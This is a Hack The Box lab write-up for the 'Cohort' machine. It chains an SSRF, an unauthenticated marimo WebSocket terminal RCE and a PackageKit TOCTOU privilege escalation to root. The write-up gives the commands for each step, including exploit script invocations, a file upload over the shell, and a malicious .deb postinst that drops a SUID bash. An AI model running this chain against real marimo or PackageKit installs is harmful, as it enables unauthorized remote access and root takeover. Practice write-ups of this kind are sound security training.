# HTB Cohort — quick writeup (no flags)

**OS:** Linux · **Tags:** SSRF, marimo, WebSocket PTY, PackageKit LPE

## Overview

1. Public nginx app on HTTPS (`cohort.htb`)
2. SSRF finds internal marimo notebook host
3. **CVE-2026-39987** → unauth shell as `marimo` via `/terminal/ws`
4. **CVE-2026-41651** (PackageKit TOCTOU / Pack2TheRoot) → root

## Recon

```bash
# /etc/hosts
# <IP> cohort.htb
# <IP> nb-<id>.cohort.htb   # po odkryciu vhosta

nmap -sC -sV -oA nmap/initial <IP>
curl -sk https://cohort.htb/
```

Useful endpoints on main site:
- `POST /api/validate` — SSRF (`{"url":"..."}`)
- `/status` — nginx upstream map (internal hosts/ports)

Loopback often blocked; try alternate forms (`0.0.0.0`, vhostnames from `/status`).

## User — marimo WebSocket PTY (CVE-2026-39987)

marimo ≤ 0.20.4 exposes **unauthenticated** terminal:

```
wss://nb-<id>.cohort.htb/terminal/ws
```

Commands = **plain text + `\n`** (not JSON).

```bash
pip install websocket-client
python3 scripts/marimo_terminal_rce.py \
  --url 'wss://nb-<id>.cohort.htb/terminal/ws' \
  -c id -c 'hostname'

# interactive
python3 scripts/marimo_terminal_rce.py \
  --url 'wss://nb-<id>.cohort.htb/terminal/ws' --interactive
```

Refs:
- https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc

## Root — PackageKit (CVE-2026-41651)

On shell as `marimo`:

```bash
pkcon --version          # e.g. 1.2.8 (vuln range 1.0.2–1.3.4)
apt-mark showhold        # packagekit often held on this box
python3 -c 'import dbus,gi; print("ok")'
```

Race: `InstallFiles(SIMULATE)` bypasses polkit → second `InstallFiles(NONE)` overwrites cached flags/paths before idle dispatch → malicious `.deb` `postinst` as root (e.g. SUID bash).

Upload PoC (any public Pack2TheRoot / CVE-2026-41651 Python PoC), then:

```bash
python3 /tmp/cve41651.py --check
python3 /tmp/cve41651.py --exec 'id' --timeout 90 --no-cleanup
# or after SUID drops:
# /tmp/.suid_bash -p -c 'id'
```

Upload over crippled PTY if no reverse shell:

```bash
python3 scripts/marimo_terminal_rce.py \
  --url 'wss://nb-<id>.cohort.htb/terminal/ws' \
  --upload ./local_poc.py /tmp/cve41651.py
```

Refs:
- https://github.com/Vozec/CVE-2026-41651
- https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html

## Notes

- Reverse shell from marimo PTY is flaky (job control / no controlling TTY) — prefer one-shot `-c` / `--exec` over interactive root shell.
- Flags intentionally omitted.
